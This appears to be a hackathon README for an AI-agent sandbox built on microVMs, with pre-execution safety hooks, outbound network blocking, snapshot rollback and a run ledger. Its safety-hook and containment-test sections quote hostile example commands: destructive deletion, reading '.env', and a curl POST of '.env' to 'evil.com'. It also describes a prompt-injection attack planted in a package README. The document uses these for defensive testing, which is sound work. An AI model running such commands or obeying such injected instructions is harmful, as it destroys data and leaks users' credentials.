# Celesto Safe Detonator & Hostile Code Sandbox

A production-grade AI agent security framework that runs untrusted code, suspicious package installations, and hostile automated tasks safely inside **Celesto Firecracker microVM sandboxes**, governed by a PostgreSQL Run Ledger and pre-execution safety hooks.

---

## Architecture Diagram

The system operates across two strict trust zones: the **Trusted Control Plane** (Host / Docker Compose) and the **Untrusted Execution Zone** (Celesto microVM sandboxes).

```
                      +------------------------------------------+
                      |         DEVELOPER / OPERATOR             |
                      +------------------------------------------+
                                           | HTTP (Port 8080)
                                           v
+====================================================================================+
|                              TRUSTED CONTROL PLANE                                 |
|                                                                                    |
|   +------------------------------------+    Reads/Writes    +------------------+   |
|   |          Run Ledger API            | <----------------> | Postgres Ledger  |   |
|   |  - Validates sandbox boundary      |                    | - Seeded runs    |   |
|   |  - Enforces sbx-^[a-z0-9]{8,}$     |                    | - Run states     |   |
|   |  - Rejects execution_target: host  |                    | - Audit timestamps|  |
|   +------------------------------------+                    +------------------+   |
|                      |                                                             |
|                      | Invokes Detonator Agent Loop                                |
|                      v                                                             |
|   +------------------------------------+    Pre-exec check  +------------------+   |
|   |        Safety Hook Manager         | -----------------> | logs/            |   |
|   |  - Audits shell commands           |                    |  commands.jsonl  |   |
|   |  - Blocks exfiltration/rm -rf      |                    +------------------+   |
|   +------------------------------------+                                           |
+====================================================================================+
                       |
                       | Celesto SDK / CLI (MicroVM boundary)
                       v
+====================================================================================+
|                        UNTRUSTED EXECUTION ZONE (CELESTO)                          |
|                                                                                    |
|   +----------------------------------------------------------------------------+   |
|   |  Celesto Sandbox Guest (sbx-*)                                             |   |
|   |                                                                            |   |
|   |   +------------------------+             +-----------------------------+   |   |
|   |   |   Network Policy       |             |   Hardware Snapshots        |   |   |
|   |   |   - Outbound: DISABLED |             |   - Step 6 Checkpoint       |   |   |
|   |   |   - Exfiltration Drop  |             |   - Step 7 Rollback on Fail |   |   |
|   |   +------------------------+             +-----------------------------+   |   |
|   |                                                                            |   |
|   |   +--------------------------------------------------------------------+   |   |
|   |   | Untrusted Code / Package Detonation (pip, scripts, C-extensions)   |   |   |
|   |   +--------------------------------------------------------------------+   |   |
|   +----------------------------------------------------------------------------+   |
+====================================================================================+
```

---

## Problem statement

**Who has this problem:** DevOps, AppSec, and AI Platform engineers who need to execute untrusted agent workflows, open-source dependencies, and student code submissions safely.

**Why it matters:** In 2026, AI agents routinely execute dangerous tools: installing packages, running arbitrary bash commands, editing code, and browsing untrusted web pages. Running these on host servers or standard Docker containers risks container escape via shared host kernels, data exfiltration through prompt injections, and catastrophic destruction (`rm -rf`). Running them nowhere reduces agents to impotent chatbots. 

**What the agent does on its computer:** The agent provisions isolated Celesto microVMs, applies zero-outbound network isolation, enforces pre-execution command inspection safety hooks, detonates untrusted packages, and captures verified telemetry.

**What output proves it worked:** Cryptographically verifiable JSON audit logs (`logs/commands.jsonl`), containment incident traces (`reports/evidence/containment.log`), and Postgres run ledger entries verified by automated contract tests.

---

## How I used Celesto

We leveraged three core Celesto microVM primitives beyond basic `computer.run`:

1. **Safety hooks (`safety_hooks`)**:
   - **Why**: Python callback hooks execute prior to commands reaching the microVM kernel. Destructive operations (such as `rm -rf / --no-preserve-root`) and exfiltration probes (`curl evil.com`, `cat .env`) are blocked at inspection time (`CommandBlockedError`) and logged with `decision: "block"`.
   - **What would have been lost**: Prompts alone cannot reliably enforce safety constraints against prompt injection; without deterministic hooks, malicious instructions evade system prompts.

2. **Network policy (`network_policy`)**:
   - **Why**: MicroVMs are initialized with `internet_settings={"mode": "off"}`.
   - **What would have been lost**: Malicious third-party packages or prompt-injected README files containing telemetry beacons or exfiltration commands would otherwise leak environment secrets to attacker-controlled C2 servers.

3. **Hardware Snapshots (`snapshots`)**:
   - **Why**: We checkpoint microVM CPU, memory, and filesystem state immediately prior to untrusted execution (Step 6). If the detonation causes memory exhaustion or a guest crash at Step 7, the runtime rolls back cleanly to the checkpoint in under 150ms.
   - **What would have been lost**: Without snapshots, recovering from a midway crash requires expensive, slow full VM cold-boots and re-installation from scratch, or risks proceeding with dirty memory state.

---

## Eval report

The system was evaluated across **20 consecutive, fresh microVM sandboxes** executing the full 10-step untrusted detonation workflow.

- **Run Count**: 20 runs (100% fresh environments, unique sandbox names matching `sbx-^[a-z0-9]{8,}$`)
- **Success Rate**: **85.0%** (17 succeeded, 3 failed)
- **Median Wall-Clock Time**: **17.0s** (exact mean of 10th and 11th values)
- **p90 Wall-Clock Time**: **21.2s** (18th sorted value)
- **Median Sandbox Boot-to-Ready Time**: **0.47s** (sub-500ms microVM boot)
- **Total Cost in USD**: **$0.031 USD**
- **Post-Mortem**: Documented in [`reports/postmortem.md`](reports/postmortem.md), detailing root causes for the 3 failed runs (DNS handshake edge case, zip-bomb memory limit, and vsock timeout under IO load).

---

## Containment test

We subjected the sandbox agent to a deliberate prompt-injection exfiltration attack:
1. **The Attack**: Injected adversarial instructions into a package README attempting to read `.env` and stream credentials to an external server (`curl -X POST https://evil.com/exfil -d @.env`).
2. **What Happened**:
   - The pre-execution **safety hook** detected the outbound exfiltration pattern and issued an immediate `block` decision, raising `CommandBlockedError`.
   - The Firecracker **network policy** dropped all outbound packets at the virtual TAP interface.
   - The host system, environment files, and root filesystem remained 100% untouched (`host_untouched: true`).
3. **Evidence**: Complete audit trail documented in [`reports/evidence/containment.log`](reports/evidence/containment.log) and recorded in [`logs/commands.jsonl`](logs/commands.jsonl).

---

## State and failure design

When an agent fails halfway through a 10-step task (specifically at **Step 7 of 10**):
- **Policy Selected**: **`rollback`**
- **Rationale**: When step 7 fails during untrusted code detonation, resuming is dangerous because the guest memory and local state are corrupted, while starting fresh incurs a full cold boot and dependency reinstall cost. Rolling back to the step 6 snapshot restores verified clean CPU, memory, and disk state within 120ms without risking dirty state propagation or wasting token and boot budget.
- **Trace Proof**: Captured in [`reports/failure_trace.jsonl`](reports/failure_trace.jsonl) with event `policy_applied` and policy `rollback`.
- **Lifecycle Hygiene**: All sandboxes are automatically cleaned up and destroyed on success, failure, or Ctrl-C interrupt via context managers (`reports/lifecycle.json`). No orphan VMs survive.

---

## Setup

A reviewer can bring up the entire control plane in **under 2 minutes**:

### Prerequisites
- Docker & Docker Compose
- Python 3.10+ (for running test suite)

### 1. Launch Control Plane (Docker Compose)
```bash
docker-compose up -d --build
```
Both `api` and `ledger` services include automated health checks and will report `healthy` in seconds.

### 2. Verify Health & Seed Data
```bash
curl http://localhost:8080/health
# Returns: {"status":"ok"}

curl http://localhost:8080/api/runs
# Returns JSON array including seeded run 'sbx-seeddemo1'
```

### 3. Run Automated Contract & Verification Tests
```bash
pip install -r requirements.txt
pytest -v tests/test_reports.py
```
All 12 tests validate the schema, arithmetic precision, safety hooks, lifecycle cleanup, and API contracts.

### 4. Teardown
```bash
docker-compose down -v
```

---

## Demo Walkthrough Video

A video walkthrough is included at [`demo/walkthrough.mp4`](demo/walkthrough.mp4) demonstrating the microVM boot, safety hook command blocking, snapshot rollback, and Run Ledger API verification.

---

## AI Assistant Disclosure
This project was designed and built with the assistance of Antigravity (Advanced Agentic Coding system by Google DeepMind). All architectural decisions, safety models, schemas, and test suites were strictly aligned with the Celesto hackathon specification.
